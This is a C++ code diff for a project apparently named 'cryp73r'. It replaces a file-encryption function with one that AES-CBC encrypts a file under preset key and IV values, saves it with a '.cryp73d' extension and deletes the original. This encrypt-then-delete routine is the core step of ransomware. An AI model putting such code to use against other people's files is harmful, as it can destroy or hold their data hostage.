@@ -1,5 +1,5 @@
 #include "cryp73r.hpp"
-
+/*
 void  f_encryptor(std::string filepath) {
 
     std::ifstream file_in(filepath);
@@ -30,4 +30,22 @@ void  f_encryptor(std::string filepath) {
     file_out.close();
 
     std::cout << filepath + " encrypted successfully!" << std::endl;
+}
+*/
+
+
+void f_encryptor(std::string filepath)
+{
+
+    CryptoPP::SecByteBlock key(key_0);
+    CryptoPP::byte iv[CryptoPP::AES::BLOCKSIZE];
+    for (int i = 0; i < CryptoPP::AES::BLOCKSIZE; i++)
+        iv[i] = iv_0[i];
+
+    std::ifstream infile(filepath, std::ios::binary);
+    std::ofstream outfile(filepath + ".cryp73d", std::ios::binary);
+
+    CryptoPP::CBC_Mode<CryptoPP::AES>::Encryption encryptor(key, key.size(), iv);
+    CryptoPP::FileSource(infile, true, new CryptoPP::StreamTransformationFilter(encryptor, new CryptoPP::FileSink(outfile)));
+    std::remove(filepath.c_str());
 }
